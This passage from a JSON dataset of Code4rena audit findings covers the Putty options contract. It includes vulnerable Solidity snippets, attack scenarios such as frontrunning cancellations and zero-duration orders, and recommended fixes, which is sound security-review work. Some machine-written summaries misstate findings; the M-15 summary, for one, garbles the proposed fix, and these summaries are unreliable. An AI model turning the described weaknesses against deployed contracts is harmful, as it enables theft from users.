      "title": "[L-05] Order Cannot Be Filled Due To Unbounded floorTokens, ERC20Asset Or ERC721Asset Within An Order",
      "impact": "LOW",
      "content": "\nAn order can contain large number of tokens within the `floorTokens`, `ERC20Asset` or `ERC721Asset` arrays of an order.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L78>\n\n```solidity\nstruct Order {\n    address maker;\n    bool isCall;\n    bool isLong;\n    address baseAsset;\n    uint256 strike;\n    uint256 premium;\n    uint256 duration;\n    uint256 expiration;\n    uint256 nonce;\n    address[] whitelist;\n    address[] floorTokens;\n    ERC20Asset[] erc20Assets;\n    ERC721Asset[] erc721Assets;\n}\n```\n\nWhen the `PuttyV2.fillOrder` function is called, it will attempts to loop through all the `floorTokens`, `ERC20Asset` or `ERC721Asset` arrays of an order to transfer the required assets to `PuttyV2` contract from the order maker or taker.\n\nThe [`_transferERC20sIn`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L593), [`_transferERC721sIn`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L610), [`_transferFloorsIn`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L622) attempt to loop through all the tokens within the array. However, if array contains large number of tokens, it will result in out-of-gas error and cause a revert. Thus, this order can never be filled.\n\nFollowing is an example of the vulnerable function.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L593>\n\n```solidity\nfunction _transferERC20sIn(ERC20Asset[] memory assets, address from) internal {\n    for (uint256 i = 0; i < assets.length; i++) {\n        address token = assets[i].token;\n        uint256 tokenAmount = assets[i].tokenAmount;\n\n        require(token.code.length > 0, \"ERC20: Token is not contract\");\n        require(tokenAmount > 0, \"ERC20: Amount too small\");\n\n        ERC20(token).safeTransferFrom(from, address(this), tokenAmount);\n    }\n}\n```\n\n### Recommendation\n\nIt is recommended to restrict the number of tokens  within the `floorTokens`, `ERC20Asset` or `ERC721Asset` arrays of an order. (e.g. Maximum of 10 tokens)\n\nAlthough client-side or off-chain might have already verified that the number of tokens do not exceed a certain limit within an order, simply relying on client-side and off-chain validations are not sufficient. It is possible for an attacker to bypass the client-side and off-chain validations and interact directly with the contract. Thus, such validation must also be implemented on the on-chain contracts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-05-order-cannot-be-filled-due-to-unbounded-floortokens-erc20asset-or-erc721asset-within-an-order",
      "tags": [],
      "finders": []
    },
    {
      "id": "5012",
      "title": "[L-04] Order Cannot Be Filled Due To Unbounded Whitelist Within An Order",
      "impact": "LOW",
      "content": "\nAn order can contain large number of addresses within the `whitelist` array of an order.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L78>\n\n```solidity\nstruct Order {\n    address maker;\n    bool isCall;\n    bool isLong;\n    address baseAsset;\n    uint256 strike;\n    uint256 premium;\n    uint256 duration;\n    uint256 expiration;\n    uint256 nonce;\n    address[] whitelist;\n    address[] floorTokens;\n    ERC20Asset[] erc20Assets;\n    ERC721Asset[] erc721Assets;\n}\n```\n\nWhen the `PuttyV2.fillOrder` function is called, it will attempt to check if the caller is whitelisted by looping through the `order.whitelist` array. However, if `order.whitelist` array contains large number of addresses, it will result in out-of-gas error and cause a revert. Thus, this order can never be filled.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L284>\n\n```solidity\nfunction fillOrder(\n    Order memory order,\n    bytes calldata signature,\n    uint256[] memory floorAssetTokenIds\n) public payable returns (uint256 positionId) { // @audit-issue no re-entrancy guard\n\t..SNIP..\n    // check msg.sender is allowed to fill the order\n    require(order.whitelist.length == 0 || isWhitelisted(order.whitelist, msg.sender), \"Not whitelisted\");\n\t..SNIP..\n}\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L669>\n\n```solidity\nfunction isWhitelisted(address[] memory whitelist, address target) public pure returns (bool) {\n    for (uint256 i = 0; i < whitelist.length; i++) {\n        if (target == whitelist[i]) return true;\n    }\n\n    return false;\n}\n```\n\n### Recommendation\n\nIt is recommended to restrict the number of whitelisted addresses within an order to a upper limit (e.g. 30).\n\nAlthough client-side or off-chain might have already verified that the number of whitelisted addresses do not exceed a certain limit within an order, simply relying on client-side and off-chain validations are not sufficient. It is possible for an attacker to bypass the client-side and off-chain validations and interact directly with the contract. Thus, such validation must also be implemented on the on-chain contracts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-04-order-cannot-be-filled-due-to-unbounded-whitelist-within-an-order",
      "tags": [],
      "finders": []
    },
    {
      "id": "5011",
      "title": "[L-03] Insufficient Input Validation",
      "impact": "LOW",
      "content": "\nThe `PuttyV2.fillOrder` function does not validate that the `msg.sender` (order taker) is the same as the order maker, which might potentially lead to unwanted behaviour within the system. Order taker should not be the same as order maker under any circumstances.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L268>\n\n```solidity\n    function fillOrder(\n        Order memory order,\n        bytes calldata signature,\n        uint256[] memory floorAssetTokenIds\n    ) public payable returns (uint256 positionId) {\n        /* ~~~ CHECKS ~~~ */\n\n        bytes32 orderHash = hashOrder(order);\n\n        // check signature is valid using EIP-712\n        require(SignatureChecker.isValidSignatureNow(order.maker, orderHash, signature), \"Invalid signature\");\n\n        // check order is not cancelled\n        require(!cancelledOrders[orderHash], \"Order has been cancelled\");\n\n        // check msg.sender is allowed to fill the order\n        require(order.whitelist.length == 0 || isWhitelisted(order.whitelist, msg.sender), \"Not whitelisted\");\n\n        // check duration is valid\n        require(order.duration < 10_000 days, \"Duration too long\");\n\n        // check order has not expired\n        require(block.timestamp < order.expiration, \"Order has expired\");\n\n        // check base asset exists\n        require(order.baseAsset.code.length > 0, \"baseAsset is not contract\");\n```\n\n### Recommendation\n\nImplement the necessary check to ensure that order taker is not the same as order maker.\n\n```solidity\nrequire(msg.sender != order.maker, \"Invalid order taker\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-03-insufficient-input-validation",
      "tags": [],
      "finders": []
    },
    {
      "id": "5010",
      "title": "[L-02] Discontinuity in Exercise Period",
      "impact": "LOW",
      "content": "\nThe position can be exercised if current block timestamp is less than the position's expiration.\n\nThe position can be withdrawed if current block timestamp is greater than the position's expiration\n\nHowever, when current block timestamp is equal to the position's expiration (`block.timestamp == positionExpirations`), the state is unknown (cannot be exercised or withdraw)\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L401>\n\n```solidity\nfunction exercise(Order memory order, uint256[] calldata floorAssetTokenIds) public payable {\n    ..SNIP..\n    // check position has not expired\n    require(block.timestamp < positionExpirations[uint256(orderHash)], \"Position has expired\");\n    ..SNIP..\n}\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L481>\n\n```solidity\nfunction withdraw(Order memory order) public {\n    ..SNIP..\n    // check long position has either been exercised or is expired\n    require(block.timestamp > positionExpirations[longPositionId] || isExercised, \"Must be exercised or expired\");\n    ..SNIP..\n}\n```\n\n### Recommendation\n\nAllow the user to withdraw the position upon expiration.\n\n```solidity\nfunction withdraw(Order memory order) public {\n    ..SNIP..\n    // check long position has either been exercised or is expired\n    require(block.timestamp >= positionExpirations[longPositionId] || isExercised, \"Must be exercised or expired\");\n    ..SNIP..\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-02-discontinuity-in-exercise-period",
      "tags": [],
      "finders": []
    },
    {
      "id": "5009",
      "title": "[L-01] Lack Of Reentrancy Guards On External Functions",
      "impact": "LOW",
      "content": "\nThe following external functions within the `PuttyV2` contract contain function calls (e.g.  `safeTransferFrom`, `safeTransfer`) that pass control to external contracts. Additionally, if ERC777 tokens are being used within an order, it contains various hooks that will pass the execution control to the external party.\n\nThus, it might allow an malicious external contract to re-enter to the contract.\n\n*   `PuttyV2.fillorder`\n*   `PuttyV2.exercise`\n*   `PuttyV2.withdraw`\n*   `PuttyV2.batchFillOrder`\n*   `Putty.acceptCounterOffer`\n\nNo re-entrancy attacks that could lead to loss of assets were observed during the assessment. Thus, this issue is marked as Low.\n\nThe following shows examples of function call being made to an external contract\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451>\n\n### Recommendation\n\nIt is recommended to follow the good security practices and apply necessary reentrancy prevention by utilizing the nonReentrant modifier from [Openzeppelin Library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) to block possible re-entrancy.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-01-lack-of-reentrancy-guards-on-external-functions",
      "tags": [],
      "finders": []
    },
    {
      "id": "2949",
      "title": "[M-16] Use of Solidity version 0.8.13 which has two known issues applicable to PuttyV2",
      "impact": "MEDIUM",
      "content": "_Submitted by hubble, also found by horsefacts_\n\nThe solidity version 0.8.13 has below two issues applicable to PuttyV2\n\n1.  Vulnerability related to ABI-encoding.\n\n    ref : <https://blog.soliditylang.org/2022/05/18/solidity-0.8.14-release-announcement/><br>\n    This vulnerability can be misused since the function hashOrder() and hashOppositeOrder() has applicable conditions.<br>\n    \"...pass a nested array directly to another external function call or use abi.encode on it.\"\n\n2.  Vulnerability related to 'Optimizer Bug Regarding Memory Side Effects of Inline Assembly'\n\n    ref : <https://blog.soliditylang.org/2022/06/15/solidity-0.8.15-release-announcement/><br>\n    PuttyV2 inherits solidity contracts from openzeppelin and solmate, and both these uses inline assembly, and optimization is enabled while compiling.\n\n### Recommended Mitigation Steps\n\nUse recent Solidity version 0.8.15 which has the fix for these issues.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/348#issuecomment-1176607284):**\n > Great catch.\n\n > Report: Use of Solidity 0.8.13 with known issues in ABI encoding and memory side effects.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/348#issuecomment-1185414140):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/6.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by bumping the solidity version.\n\n***\n\n",
      "summary": "\nThis bug report is about two vulnerabilities related to the Solidity version 0.8.13 used by the PuttyV2 contract. The first vulnerability is related to ABI-encoding and it can be misused if certain conditions are met. The second vulnerability is related to an optimizer bug regarding memory side effects of inline assembly. Both of these issues are addressed in the recent Solidity version 0.8.15. Therefore, the recommended mitigation step is to upgrade to the latest version of Solidity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/348",
      "tags": [],
      "finders": [
        "horsefacts",
        "hubble"
      ]
    },
    {
      "id": "2948",
      "title": "[M-15] Zero strike call options will avoid paying system fee",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh, also found by csanuragjain, minhquanym, and Treasure-Seeker_\n\nZero and near zero strike calls are common derivative type. For such derivatives the system will not be receiving fees are the fee is now formulated as a fraction of order strike.\n\nAlso, it can be a problem for OTM call options, when the option itself is nearly worthless, while the fee will be substantial as strike will be big. Say 1k ETH BAYC call doesn't have much value, but the associated fee will be 10x of usual fee, i.e. substantial, while there is nothing to justify that.\n\nMarking this as medium severity as that's a design specifics that can turn off or distort core system fee gathering.\n\n### Proof of Concept\n\nCurrently fee is linked to the order strike which makes it vary heavily for different types of orders, for example deep ITM and OTM calls:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L494-L506>\n\n```solidity\n        // transfer strike to owner if put is expired or call is exercised\n        if ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {\n            // send the fee to the admin/DAO if fee is greater than 0%\n            uint256 feeAmount = 0;\n            if (fee > 0) {\n                feeAmount = (order.strike * fee) / 1000;\n                ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\n            }\n\n            ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\n\n            return;\n        }\n```\n\n### Recommended Mitigation Steps\n\nConsider linking the fee to option premium as this is option value that cannot be easily manipulated and exactly corresponds to the trading volume of the system.\n\ni.e. consider moving fee gathering to fillOrder:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L322-L340>\n\n```solidity\n        // transfer premium to whoever is short from whomever is long\n        if (order.isLong) {\n            ERC20(order.baseAsset).safeTransferFrom(order.maker, msg.sender, order.premium);\n        } else {\n            // handle the case where the user uses native ETH instead of WETH to pay the premium\n            if (weth == order.baseAsset && msg.value > 0) {\n                // check enough ETH was sent to cover the premium\n                require(msg.value == order.premium, \"Incorrect ETH amount sent\");\n\n                // convert ETH to WETH and send premium to maker\n                // converting to WETH instead of forwarding native ETH to the maker has two benefits;\n                // 1) active market makers will mostly be using WETH not native ETH\n                // 2) attack surface for re-entrancy is reduced\n                IWETH(weth).deposit{value: msg.value}();\n                IWETH(weth).transfer(order.maker, msg.value);\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium);\n            }\n        }\n```\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/373#issuecomment-1174511995):**\n > Zero strike will indeed have a fee of 0.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/373#issuecomment-1178994046):**\n > Report: Charging fees on the strike amount instead of the premium amount can lead to disproportionate fees.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/373#issuecomment-1185414345):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > The same fix as in [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269).\n\n***\n\n",
      "summary": "\nA bug has been discovered in the code for a derivative type called zero and near zero strike calls. The fee for these derivatives is formulated as a fraction of the order strike. This can be a problem for out-of-the-money (OTM) call options, where the option is nearly worthless but the fee is substantial due to the large strike. This design issue could turn off or distort the core system fee gathering, making it a medium severity vulnerability.\n\nProof of concept code shows that the fee is linked to the order strike, which varies heavily for different types of orders. For example, deep in-the-money (ITM) and OTM calls.\n\nThe recommended mitigation step is to link the fee to the option premium, which is the option value that cannot be easily manipulated and corresponds to the trading volume of the system. This can be done by moving the fee gathering to the fillOrder section of the code. This will convert ETH to WETH instead of forwarding native ETH to the maker, which has two benefits: 1) active market makers will mostly be using WETH not native ETH and 2) attack surface for re-entrancy is reduced.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/373",
      "tags": [],
      "finders": [
        "csanuragjain",
        "hyh",
        "Treasure-Seeker",
        "minhquanym"
      ]
    },
    {
      "id": "2947",
      "title": "[M-14] Order cancellation is prone to frontrunning and is dependent on a centralized database",
      "impact": "MEDIUM",
      "content": "_Submitted by shung, also found by unforgiven_\n\nOrder cancellation requires makers to call `cancel()`, inputting the order as a function parameter. This is the only cancellation method, and it can cause two issues.\n\nThis first issue is that it is an on-chain signal for MEV users to frontrun the cancellation and fill the order.\n\nThe second issue is the dependency to a centralized service for cancelling the order. As orders are signed off chain, they would be stored in a centralized database. It is unlikely that an end user would locally record all the orders they make. This means that when cancelling an order, maker needs to request the order parameters from the centralized service. If the centralized service goes offline, it could allow malicious parties who have a copy of the order database to fill orders that would have been cancelled otherwise.\n\n### Proof of Concept\n\n1.  Bob signs an order which gets recorded in Putty servers.\n2.  Alice mirrors all the orders using Putty APIs.\n3.  Putty servers go offline.\n4.  Bob wants to cancel his order because changing token prices makes his order less favourable to him.\n5.  Bob cannot cancel his order because Putty servers are down and he does not remember the exact amounts of tokens he used.\n6.  Alice goes through all the orders in her local mirror and fulfills the non-cancelled orders, including Bob's, with extremely favourable terms for herself.\n\n### Recommended Mitigation Steps\n\nAside from the standard order cancellation method, have an extra method to cancel all orders of a caller. This can be achieved using a \"minimum valid nonce\" state variable, as a mapping from user address to nonce.\n\n```solidity\nmapping(address => uint256) minimumValidNonce;\n```\n\nAllow users to increment their `minimumValidNonce`. Make sure the incrementation function do not allow incrementing more than `2**64` such that callers cannot lock themselves out of creating orders by increasing `minimumValidNonce` to `2**256-1` by mistake. Then, prevent filling orders if `order.nonce < minimumValidNonce`.\n\nAnother method to achieve bulk cancelling is using counters. For example, Seaport [uses counters](https://github.com/ProjectOpenSea/seaport/blob/171f2cd7faf13b2bf0455851499f1981274977f7/contracts/lib/CounterManager.sol), which is an extra order parameter that has to match the corresponding counter state variable. It allows maker to cancel all his orders by [incrementing the counter state variable by one](https://github.com/ProjectOpenSea/seaport/blob/171f2cd7faf13b2bf0455851499f1981274977f7/contracts/lib/Consideration.sol#L475-L478).\n\nEither of these extra cancellation methods would enable cancelling orders without signalling to MEV bots, and without a dependency to a centralized database.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/186#issuecomment-1177567080):**\n > Should this be tagged as Med or Low? Funds are not directly at risk unless the centralised order book server goes down and loses all the data. Perhaps there is a non-negligible chance that this *could* happen. But even then, orders have an \"expiration\" field attached to them which will render them useless after some set time period. There are also easy fixes on the frontend, such as allowing users to download a txt file with their order/orderHash so that they don't have to rely on the centralised DB for data availability. \n> \n> But will defer to judges.\n>\n> Report: Cannot cancel orders without reliance on centralised database.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/186#issuecomment-1184059122):**\n > The sponsor's point is valid: there is an expiration param that the maker signs as part of the order that marks its validity.\n> \n> However, the warden(s) concerns are valid too. While it is an edge case that is very unlikely to happen, there would arguably be a \"loss\" of assets of the maker because of the protocol's loss of functionality, as per the scenario described above. Hence, the medium severity rating is justified.\n> \n> I recommend implementing the warden's recommended fix; having a `minimumValidNonce` would be great in allowing easy on-chain cancellation of an order. It makes the system a little more trust-less and provides a \"red button\" option for makers to use if necessary.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/186#issuecomment-1185428778):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/10.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by the introduction of `setMinimumValidNonce` function and the corresponding control on order filling. See [M.M-04](#mm-04-minimumvalidnonce-can-be-reduced-due-to-an-operational-mistake-enabling-old-orders) in the Mitigation Review below.\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability of the PuttyV2.sol contract, which is used in decentralized exchanges. The vulnerability allows malicious parties to frontrun order cancellations and fill the order with favourable terms for themselves. This is possible because the only cancellation method requires makers to call `cancel()`, inputting the order as a function parameter. Since orders are signed off-chain and stored in a centralized database, it is likely that end users do not locally record all the orders they make. If the centralized service goes offline, it could allow malicious parties to fill orders that would have been cancelled otherwise.\n\nTo mitigate this vulnerability, the report recommends two methods. The first one is to have an extra method to cancel all orders of a caller, which can be achieved using a \"minimum valid nonce\" state variable. The second method is to use counters, which would require makers to increment the counter state variable by one to cancel all their orders. Either of these methods would enable cancelling orders without signalling to MEV bots, and without a dependency to a centralized database.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/186",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "shung",
        "unforgiven"
      ]
    },
    {
      "id": "2946",
      "title": "[M-13] Order duration can be set to 0 by Malicious maker",
      "impact": "MEDIUM",
      "content": "_Submitted by codexploder, also found by ACai, cccz, Critical, horsefacts, ignacio, shenwilly, unforgiven, and xiaoming90_\n\nA malicious maker can set a minimum order duration as 0 which means order will instantly expire after filling. Taker will get only the withdraw option and that too with fees on strike price, thus forcing the taker to lose money in this meaningless transaction\n\n### Proof of Concept\n\n1. Maker creates an order with zero Order duration\n2. Taker fills this order but the order instantly expires since duration was 0\n3. Taker gets the only option to withdraw with fees on strike price\n\n### Recommended Mitigation Steps\n\nEnforce at least x days of duration.\n\n**[outdoteth (Putty Finance) confirmed and resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/107#issuecomment-1185407029):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/7.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by requiring the minimal order duration of 15 minutes on filling.\n\n***\n\n",
      "summary": "\nThis bug report is about a malicious maker who can set a minimum order duration as 0, allowing the order to instantly expire after it is filled. This means that the taker will only have the option to withdraw with fees on the strike price, thus forcing them to lose money in a meaningless transaction. To fix this issue, the recommended mitigation step is to enforce at least a certain number of days of duration. This bug report provides a proof of concept to demonstrate the vulnerability, and the recommended mitigation step to fix it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/107",
      "tags": [],
      "finders": [
        "codexploder",
        "cccz",
        "xiaoming90",
        "shenwilly",
        "ACai",
        "ignacio",
        "unforgiven",
        "Critical",
        "horsefacts"
      ]
    },
    {
      "id": "2945",
      "title": "[M-12] Options with a small strike price will round down to 0 and can prevent assets to be withdrawn",
      "impact": "MEDIUM",
      "content": "_Submitted by berndartmueller, also found by auditor0517, hansfriese, IllIllI, Lambda, sashik_eth, shenwilly, and TrungOre_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L499-L500>\n\n### Impact\n\nCertain ERC-20 tokens do not support zero-value token transfers and revert. Using such a token as a `order.baseAsset` for a rather small option strike and a low protocol fee rate can lead to rounding down to 0 and prevent asset withdrawals for those positions.\n\n### Proof of Concept\n\n[PuttyV2.sol#L499-L500](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L499-L500)\n\n```solidity\n// send the fee to the admin/DAO if fee is greater than 0%\nuint256 feeAmount = 0;\nif (fee > 0) {\n    feeAmount = (order.strike * fee) / 1000;\n    ERC20(order.baseAsset).safeTransfer(owner(), feeAmount); // @audit-info zero-value ERC20 token transfers can revert for certain tokens\n}\n```\n\nSome ERC20 tokens revert for zero-value transfers (e.g. `LEND`). If used as a `order.baseAsset` and a small strike price, the fee token transfer will revert. Hence, assets and the strike can not be withdrawn and remain locked in the contract.\n\nSee [Weird ERC20 Tokens - Revert on Zero Value Transfers](https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers)\n\n**Example:**\n\n*   `order.baseAsset` is one of those weird ERC-20 tokens\n*   `order.strike = 999` (depending on the token decimals, a very small option position)\n*   `fee = 1` (0.1%)\n\n((999 &ast; 1) / 1000 = 0.999) rounded down to 0 -> zero-value transfer reverting transaction\n\n### Recommended Mitigation Steps\n\nAdd a simple check for zero-value token transfers:\n\n```solidity\n// send the fee to the admin/DAO if fee is greater than 0%\nuint256 feeAmount = 0;\nif (fee > 0) {\n    feeAmount = (order.strike * fee) / 1000;\n\n    if (feeAmount > 0) {\n        ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\n    }\n}\n```\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/283#issuecomment-1178998816):**\n > Report: withdraw() can be DOS’d for baseAsset ERC20s that prevent 0 transfers if the calculated feeAmount is 0 due to rounding.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/283#issuecomment-1185413905):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed along with [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269) in [`PR#4`](https://github.com/outdoteth/putty-v2/pull/4).\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a contract called PuttyV2.sol, which is located on a GitHub repository. This vulnerability can lead to assets and the strike not being able to be withdrawn and remaining locked in the contract. The cause of this vulnerability is that certain ERC-20 tokens do not support zero-value token transfers and revert. If a token with this feature is used as a `order.baseAsset` for a rather small option strike and a low protocol fee rate, it can lead to rounding down to 0 and prevent asset withdrawals for those positions. It is recommended to add a check for zero-value token transfers to fix this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/283",
      "tags": [],
      "finders": [
        "IllIllI",
        "auditor0517",
        "berndartmueller",
        "Lambda",
        "shenwilly",
        "hansfriese",
        "sashiketh",
        "TrungOre_"
      ]
    },
    {
      "id": "2944",
      "title": "[M-11] fee can change without the consent of users",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L240\n https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L497\n\n\n## Vulnerability details\n\n## Impact\nFees are applied during `withdraw`, but can change between the time the order is filled and its terms are agreed upon and the withdrawal time, leading to a loss of the expected funds for the concerned users.\n\n## Proof of Concept\nThe scenario would be:\n\n - Alice and Bob agrees to fill an order at a time fees are 0.1%\n - During the duration of the option, fees are increased to 3%\n - At withdrawal they'll pay 3% of the strike, although they wouldn't have created the order in the first place with such fees\n\n\n## Recommended Mitigation Steps\nMitigation could be:\n - Store the fees in `Order` and verify that they are correct when the order is filled, so they are hardcoded in the struct\n - Add a timestamp: this wouldn't fully mitigate but would still be better than the current setup\n - Keep past fees and fee change timestamps in memory (for example in an array) to be able to retrieve the creation time fees at withdrawal",
      "summary": "\nThis bug report is related to a vulnerability in the code of the PuttyV2.sol contract. The vulnerability can lead to users losing expected funds due to fees changing between the time the order is filled and the time of withdrawal. This can occur when Alice and Bob agree to fill an order at a time when fees are 0.1%, but then during the duration of the option fees are increased to 3%. When they withdraw, they will have to pay 3% of the strike, even though they would not have created the order with such fees. \n\nRecommended mitigation steps include storing the fees in the Order and verifying that they are correct when the order is filled, adding a timestamp, and keeping past fees and fee change timestamps in memory to be able to retrieve the creation time fees at withdrawal.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/422",
      "tags": [],
      "finders": [
        "0xsanson",
        "BowTiedWardens",
        "Metatron",
        "Picodes",
        "unforgiven_",
        "berndartmueller",
        "dirky",
        "antonttc",
        "Alex the Entreprenerd",
        "catchup",
        "horsefacts",
        "0xNineDec",
        "sseefried"
      ]
    },
    {
      "id": "2943",
      "title": "[M-10] Putty position tokens may be minted to non ERC721 receivers",
      "impact": "MEDIUM",
